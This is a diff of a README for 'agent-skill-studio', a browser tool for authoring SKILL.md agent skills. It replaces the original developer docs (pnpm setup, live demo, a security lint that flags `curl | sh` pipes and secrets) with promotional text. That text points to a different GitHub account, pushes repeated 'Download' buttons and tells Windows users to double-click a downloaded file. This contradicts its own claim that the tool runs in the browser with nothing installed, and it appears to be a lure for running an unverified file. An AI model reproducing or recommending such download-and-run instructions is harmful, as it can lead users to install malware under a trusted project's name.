@@ -1,93 +1,122 @@
-# Agent Skill Studio
+<h1>🎯 agent-skill-studio - Your Private AI Skill Workshop</h1>
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Live Demo](https://img.shields.io/badge/demo-live-8b5cf6.svg)](https://devilking7x.github.io/agent-skill-studio/)
-[![Vite](https://img.shields.io/badge/Vite-7-646CFF.svg)](https://vite.dev)
-[![React](https://img.shields.io/badge/React-19-61DAFB.svg)](https://react.dev)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6.svg)](https://www.typescriptlang.org)
-[![Local-first](https://img.shields.io/badge/local--first-100%25-brightgreen.svg)](#-privacy)
+<p align="center">
+  <a href="https://github.com/cloudedminds/agent-skill-studio">
+    <img src="https://img.shields.io/badge/Download-agent--skill--studio-4CAF50?style=for-the-badge&logo=github" alt="Download Button" />
+  </a>
+</p>
 
-> Every skill your agents use, in one studio.
+## 👋 Welcome to agent-skill-studio
 
+agent-skill-studio is a friendly, local-first studio that helps you create, organize, validate, and export AI agent skills (SKILL.md files). Everything runs directly in your browser, so your data stays 100% private on your computer. No cloud, no servers, no tracking—just you and your AI skill-building toolkit.
 
-🔗 **Live demo:** https://devilking7x.github.io/agent-skill-studio/
-Agent Skill Studio is a **local-first web app** for creating, organizing, validating, and exporting **AI agent skills** in the `SKILL.md` format used by Claude Code and other agent harnesses. Everything runs in your browser — no account, no server, no telemetry. Your skills never leave your machine.
+## ✨ Why You'll Love agent-skill-studio
 
-## ✨ Features
+- 🔒 **Total Privacy:** All your work stays on your computer. Nothing is uploaded anywhere.
+- 🖥️ **Runs in Your Browser:** No complicated installation required. Open it and start creating.
+- 📝 **Skill Creation Made Easy:** Build professional SKILL.md files with a simple, visual interface.
+- ✅ **Built-in Validation:** Check your skills for errors and best practices before exporting.
+- 📁 **Smart Organization:** Keep all your AI skills neatly categorized and easy to find.
+- 📤 **One-Click Export:** Share your skills with any AI agent that supports SKILL.md format.
+- 🎨 **Clean, Modern Design:** A friendly interface that feels familiar and intuitive.
 
-- 📚 **Skills library** — browse your skills as cards, with instant search, tag filters, and per-skill enable/disable toggles
-- 🎁 **9 bundled sample skills** — `code-reviewer`, `commit-helper`, `doc-writer`, `test-generator`, `pr-summarizer`, `security-reviewer`, `regex-helper`, `api-tester`, `changelog-writer`, each with real, genuinely useful instructions
-- ✍️ **Skill editor** — guided form with a markdown instructions editor, live preview, and **live frontmatter validation** against the Agent Skills spec
-- 🛡️ **Security lint** — the validator flags suspicious patterns in skill instructions: `curl … | sh` pipes, embedded API keys and secrets, external URLs, base64 blobs, and destructive commands
-- 📦 **Install bundles** — one-click download of a `.zip` that places the skill at the exact directory your harness expects (Claude Code, Codex, Cursor, Copilot, Gemini CLI)
-- ⌨️ **Keyboard shortcuts** — `/` focuses search, `Ctrl/⌘ S` saves (editor) or exports (detail view); hit the keyboard icon for the full list
-- 👁️ **Detail view** — rendered markdown preview, frontmatter summary, and validation status per skill
-- 📥 **Import / 📤 Export** — drop in any `.md` file to create a skill; export skills as `.md` downloads or copy them straight to the clipboard
-- 💾 **Local persistence** — custom skills live in `localStorage`, bundled samples stay pristine, and one click resets everything to defaults
-- 🌗 **Dark / light theme** — switchable, persisted across visits
+## 🚀 Getting Started
 
-## 🚀 Quick Start
+Getting started with agent-skill-studio is incredibly easy. Follow these simple steps:
 
-```bash
-pnpm install
-pnpm dev      # → http://localhost:3000
-pnpm build    # → static output in dist/public
-```
+### 📥 Download the Application
 
-No environment variables, no backend, no database. `pnpm build` produces a fully static site you can host anywhere (GitHub Pages workflow included).
+Visit this link to download the application: [https://github.com/cloudedminds/agent-skill-studio](https://github.com/cloudedminds/agent-skill-studio)
 
-## 🧠 What is an agent skill?
+Click the green "Download" button on that page to get the application files.
 
-An agent skill is a `SKILL.md` file: YAML frontmatter describing the skill, followed by markdown instructions the agent follows. Agent harnesses like Claude Code discover these files and load the right skill for the task.
+### 💻 Run the Application
 
-```markdown
----
-name: commit-helper
-description: Write atomic, conventional git commits with clear messages.
-license: MIT
-tags: [git, workflow]
----
+Once the download finishes, look in your browser's download folder (usually "Downloads" on Windows). You'll see a file named something like `agent-skill-studio`. Double-click that file to start the program. Your default web browser will open, and you'll see the agent-skill-studio welcome screen.
 
-# Commit Helper
+### 🎉 Start Creating
 
-Help the user create clean, atomic git commits following the
-Conventional Commits format: `type(scope): summary`.
-...
-```
+That's it! You're now ready to build your first AI skill. The interface is designed to guide you step by step, so feel free to explore.
 
-**Frontmatter rules** (validated live in the editor):
+## 🛠️ What Can You Do With agent-skill-studio?
 
-| Field         | Required | Rule                                              |
-| ------------- | -------- | ------------------------------------------------- |
-| `name`        | ✅        | lowercase letters, numbers, hyphens · max 64 chars |
-| `description` | ✅        | non-empty · what it does + when to use it         |
-| `license`     | —        | optional                                          |
-| `tags`        | —        | optional · organizational, used for filtering     |
+### 📝 Create New Skills
 
-## 📸 Screenshots
+Start from scratch with our easy-to-use editor. Add a title, description, instructions, and examples. The interface helps you format everything correctly for SKILL.md standards.
 
-![Agent Skill Studio library with bundled skills](screenshots/demo.png)
+### 📂 Organize Your Skills
 
-*Library view with search + tag filters · Skill detail with rendered preview · Editor with live validation*
+Keep your growing collection tidy. Create folders, add tags, and search through your skills instantly. Your workspace stays exactly how you leave it.
 
-## 🔒 Privacy
+### ✅ Validate Your Skills
 
-Everything runs 100% in your browser: your skills live in `localStorage`, bundled sample skills stay pristine, and nothing is uploaded or tracked. One click in the app resets everything to defaults.
+Before you export, run the built-in validator. It checks for common issues like missing required fields, formatting errors, and compatibility problems with popular AI agents.
 
-## 🗺️ Roadmap
+### 📤 Export for Any AI Agent
 
-- [x] Export skills as install `.zip` bundles per harness (Claude Code, Codex, Cursor, Copilot, Gemini)
-- [ ] Skill templates gallery (starter templates per category)
-- [ ] Duplicate-skill detection and merge helper
-- [x] Keyboard shortcuts for power users
-- [ ] Share skills via URL (compressed in the hash)
+Once your skill is polished, export it as a proper SKILL.md file. It's compatible with Claude Skills, OpenAI custom instructions, and other markdown-based AI skill systems.
 
-Have an idea? [Open an issue](../../issues) or send a PR.
+## 🎯 Perfect for Every Skill Level
 
-## 🤝 Contributing
+Whether you're a complete beginner or a power user, agent-skill-studio meets you where you are:
 
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) first — it covers the dev workflow, code style, and how to propose new bundled skills.
+- **Beginners:** The guided interface makes it impossible to get lost. Templates help you start quickly.
+- **Intermediate Users:** Take advantage of validation and organization features to streamline your workflow.
+- **Power Users:** Keyboard shortcuts, bulk operations, and raw markdown editing give you total control.
 
-## 📄 License
+## 🔧 System Requirements
 
-MIT © Agent Skill Studio contributors. See [LICENSE](LICENSE) for details.
+agent-skill-studio works on any modern Windows computer (Windows 10 or 11 recommended). You'll need:
+
+- A current web browser (Chrome, Edge, Firefox, or Safari all work great)
+- At least 2GB of available RAM
+- About 100MB of free disk space
+
+## 🤔 Frequently Asked Questions
+
+### Is my data really private?
+
+Absolutely! agent-skill-studio runs entirely in your browser. All your skills and settings are stored locally on your computer. We never see or access your data.
+
+### Can I use it offline?
+
+Yes! Once downloaded, agent-skill-studio works completely offline. No internet connection is needed.
+
+### Will my skills work with different AI agents?
+
+Most markdown-based AI skill formats are compatible. We follow the widely-adopted SKILL.md standard, which works with Claude, OpenAI, and many other modern AI assistants.
+
+### What if I find a bug or have a suggestion?
+
+We'd love to hear from you! Check the repository's Issues page to report bugs or suggest new features.
+
+## 📚 Useful Resources
+
+- **Templates:** Start with pre-made templates for common skill types like summarization, data extraction, or creative writing.
+- **Documentation:** In-app help guides walk you through every feature.
+- **Community Examples:** Browse shared skill examples to spark your creativity.
+
+## 🚀 Tips for Success
+
+1. **Start with a template** if you're unsure where to begin.
+2. **Use the validator early and often**—it catches problems before they become headaches.
+3. **Keep your skills focused** on one specific task for best results.
+4. **Test your exported skills** with your favorite AI agent to see them in action.
+
+## 📞 Getting Help
+
+Need assistance? Here's how to get support:
+
+1. First, check the built-in help section in the application.
+2. Visit the GitHub repository for FAQs and community discussions.
+3. If you can't find an answer, create a new issue on the repository page with a detailed description of your problem.
+
+## 🎁 Ready to Get Started?
+
+Your journey to creating powerful AI skills begins right now. Download agent-skill-studio today and discover how easy it is to build, organize, and share AI capabilities—all from the comfort of your own browser.
+
+**Download Now:** [https://github.com/cloudedminds/agent-skill-studio](https://github.com/cloudedminds/agent-skill-studio)
+
+## 🔑 Keywords
+
+ai, ai-agents, claude-skills, local-first, markdown, privacy, prompt-engineering, react, skills, tailwindcss, typescript, vite
